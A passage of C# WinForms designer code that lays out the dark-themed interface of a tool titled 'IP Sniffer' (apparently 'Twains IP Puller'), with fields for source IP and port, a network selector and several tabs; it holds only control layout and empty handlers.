            this.metroPanel2.Controls.Add(this.metroLabel2);
            this.metroPanel2.HorizontalScrollbarBarColor = true;
            this.metroPanel2.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel2.HorizontalScrollbarSize = 10;
            this.metroPanel2.Location = new System.Drawing.Point(0, 46);
            this.metroPanel2.Name = "metroPanel2";
            this.metroPanel2.Size = new System.Drawing.Size(644, 31);
            this.metroPanel2.TabIndex = 9;
            this.metroPanel2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel2.VerticalScrollbarBarColor = true;
            this.metroPanel2.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel2.VerticalScrollbarSize = 10;
            // 
            // sourcePortBox
            // 
            this.sourcePortBox.FontSize = MetroFramework.MetroTextBoxSize.Medium;
            this.sourcePortBox.Lines = new string[0];
            this.sourcePortBox.Location = new System.Drawing.Point(458, 3);
            this.sourcePortBox.MaxLength = 32767;
            this.sourcePortBox.Name = "sourcePortBox";
            this.sourcePortBox.PasswordChar = '\0';
            this.sourcePortBox.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.sourcePortBox.SelectedText = "";
            this.sourcePortBox.Size = new System.Drawing.Size(181, 23);
            this.sourcePortBox.TabIndex = 9;
            this.sourcePortBox.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.sourcePortBox.UseSelectable = true;
            // 
            // metroLabel4
            // 
            this.metroLabel4.AutoSize = true;
            this.metroLabel4.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel4.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel4.Location = new System.Drawing.Point(344, 0);
            this.metroLabel4.Name = "metroLabel4";
            this.metroLabel4.Size = new System.Drawing.Size(107, 25);
            this.metroLabel4.TabIndex = 8;
            this.metroLabel4.Text = "Source Port:";
            this.metroLabel4.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel4.UseStyleColors = true;
            // 
            // sourceIPBox
            // 
            this.sourceIPBox.FontSize = MetroFramework.MetroTextBoxSize.Medium;
            this.sourceIPBox.Lines = new string[0];
            this.sourceIPBox.Location = new System.Drawing.Point(99, 3);
            this.sourceIPBox.MaxLength = 32767;
            this.sourceIPBox.Name = "sourceIPBox";
            this.sourceIPBox.PasswordChar = '\0';
            this.sourceIPBox.ScrollBars = System.Windows.Forms.ScrollBars.None;
            this.sourceIPBox.SelectedText = "";
            this.sourceIPBox.Size = new System.Drawing.Size(181, 23);
            this.sourceIPBox.TabIndex = 7;
            this.sourceIPBox.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.sourceIPBox.UseSelectable = true;
            // 
            // metroLabel2
            // 
            this.metroLabel2.AutoSize = true;
            this.metroLabel2.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel2.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.metroLabel2.Location = new System.Drawing.Point(3, 0);
            this.metroLabel2.Name = "metroLabel2";
            this.metroLabel2.Size = new System.Drawing.Size(90, 25);
            this.metroLabel2.TabIndex = 6;
            this.metroLabel2.Text = "Source IP:";
            this.metroLabel2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel2.UseStyleColors = true;
            // 
            // metroPanel1
            // 
            this.metroPanel1.Controls.Add(this.networkBox);
            this.metroPanel1.Controls.Add(this.networkLabel);
            this.metroPanel1.HorizontalScrollbarBarColor = true;
            this.metroPanel1.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel1.HorizontalScrollbarSize = 10;
            this.metroPanel1.Location = new System.Drawing.Point(0, 3);
            this.metroPanel1.Name = "metroPanel1";
            this.metroPanel1.Size = new System.Drawing.Size(644, 37);
            this.metroPanel1.TabIndex = 8;
            this.metroPanel1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel1.VerticalScrollbarBarColor = true;
            this.metroPanel1.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel1.VerticalScrollbarSize = 10;
            // 
            // networkBox
            // 
            this.networkBox.FormattingEnabled = true;
            this.networkBox.ItemHeight = 23;
            this.networkBox.Location = new System.Drawing.Point(99, 3);
            this.networkBox.Name = "networkBox";
            this.networkBox.Size = new System.Drawing.Size(540, 29);
            this.networkBox.TabIndex = 4;
            this.networkBox.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.networkBox.UseSelectable = true;
            this.networkBox.UseStyleColors = true;
            this.networkBox.SelectedIndexChanged += new System.EventHandler(this.networkBox_SelectedIndexChanged);
            // 
            // networkLabel
            // 
            this.networkLabel.AutoSize = true;
            this.networkLabel.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.networkLabel.FontWeight = MetroFramework.MetroLabelWeight.Regular;
            this.networkLabel.Location = new System.Drawing.Point(3, 3);
            this.networkLabel.Name = "networkLabel";
            this.networkLabel.Size = new System.Drawing.Size(83, 25);
            this.networkLabel.TabIndex = 3;
            this.networkLabel.Text = "Network:";
            this.networkLabel.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.networkLabel.UseStyleColors = true;
            // 
            // tabControl
            // 
            this.tabControl.Controls.Add(this.mainTab);
            this.tabControl.Controls.Add(this.snifferTab);
            this.tabControl.Controls.Add(this.locationTab);
            this.tabControl.Controls.Add(this.howToTab);
            this.tabControl.Controls.Add(this.metroTabPage1);
            this.tabControl.Location = new System.Drawing.Point(23, 63);
            this.tabControl.Name = "tabControl";
            this.tabControl.SelectedIndex = 4;
            this.tabControl.Size = new System.Drawing.Size(651, 359);
            this.tabControl.TabIndex = 0;
            this.tabControl.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.tabControl.UseSelectable = true;
            this.tabControl.UseStyleColors = true;
            this.tabControl.SelectedIndexChanged += new System.EventHandler(this.tabControl_SelectedIndexChanged);
            // 
            // metroTabPage1
            // 
            this.metroTabPage1.Controls.Add(this.metroLabel20);
            this.metroTabPage1.HorizontalScrollbarBarColor = true;
            this.metroTabPage1.HorizontalScrollbarHighlightOnWheel = false;
            this.metroTabPage1.HorizontalScrollbarSize = 10;
            this.metroTabPage1.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage1.Name = "metroTabPage1";
            this.metroTabPage1.Size = new System.Drawing.Size(643, 317);
            this.metroTabPage1.TabIndex = 6;
            this.metroTabPage1.Text = "Information";
            this.metroTabPage1.VerticalScrollbarBarColor = true;
            this.metroTabPage1.VerticalScrollbarHighlightOnWheel = false;
            this.metroTabPage1.VerticalScrollbarSize = 10;
            this.metroTabPage1.Visible = false;
            // 
            // metroLabel20
            // 
            this.metroLabel20.AutoSize = true;
            this.metroLabel20.BackColor = System.Drawing.Color.Transparent;
            this.metroLabel20.FontSize = MetroFramework.MetroLabelSize.Tall;
            this.metroLabel20.FontWeight = MetroFramework.MetroLabelWeight.Bold;
            this.metroLabel20.Location = new System.Drawing.Point(12, 14);
            this.metroLabel20.Name = "metroLabel20";
            this.metroLabel20.Size = new System.Drawing.Size(533, 100);
            this.metroLabel20.TabIndex = 16;
            this.metroLabel20.Text = "If you\'re seeing this, this isnt the original Twains IP Puller.\r\nEither you\'re ed" +
    "iting the source i released or the person didnt\r\nremove this tab.\r\n";
            this.metroLabel20.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroLabel20.UseStyleColors = true;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(7, 18);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(61, 50);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 16;
            this.pictureBox1.TabStop = false;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(697, 445);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.metroLabel18);
            this.Controls.Add(this.styleBox);
            this.Controls.Add(this.metroLabel24);
            this.Controls.Add(this.tabControl);
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.Resizable = false;
            this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
            this.Style = MetroFramework.MetroColorStyle.Default;
            this.Text = "       Source Version - IP Sniffer";
            this.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.styleManager)).EndInit();
            this.contextMenuStrip1.ResumeLayout(false);
            this.howToTab.ResumeLayout(false);
            this.metroPanel12.ResumeLayout(false);
            this.metroPanel12.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.dataGridView2)).EndInit();
            this.metroPanel11.ResumeLayout(false);
            this.metroPanel11.PerformLayout();
            this.metroPanel8.ResumeLayout(false);
            this.metroPanel8.PerformLayout();
            this.locationTab.ResumeLayout(false);
            this.metroPanel7.ResumeLayout(false);
            this.metroPanel7.PerformLayout();
            this.metroPanel6.ResumeLayout(false);
            this.metroPanel6.PerformLayout();
            this.snifferTab.ResumeLayout(false);
            this.metroPanel9.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).EndInit();
            this.mainTab.ResumeLayout(false);
            this.metroPanel5.ResumeLayout(false);
            this.metroPanel4.ResumeLayout(false);
            this.metroPanel4.PerformLayout();
            this.metroPanel3.ResumeLayout(false);
            this.metroPanel3.PerformLayout();
            this.metroPanel2.ResumeLayout(false);
            this.metroPanel2.PerformLayout();
            this.metroPanel1.ResumeLayout(false);
            this.metroPanel1.PerformLayout();
            this.tabControl.ResumeLayout(false);
            this.metroTabPage1.ResumeLayout(false);
            this.metroTabPage1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

    }

    private void SnifferTab_Click(object sender, EventArgs e)
    {
    }

    private delegate string CurrentIPCallback();

    private delegate void ShowContextMenuCallback(Point p);

    private delegate void RefreshGridCallback();

    private delegate void AddGridCallback(ListObject obj);

    private delegate string CurrentGTCallback();

    private delegate void SetDSCallback(BindingList<ListObject> list);

    private delegate void AddGridCallback2(PortObject obj);

    private delegate void RefreshGridCallback2();

    private delegate void SetDSCallback2(BindingList<PortObject> list);

    private delegate int DropdownIndexCallback();

    private delegate string DropdownValue2Callback();

    private delegate string DropdownValue3Callback();

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
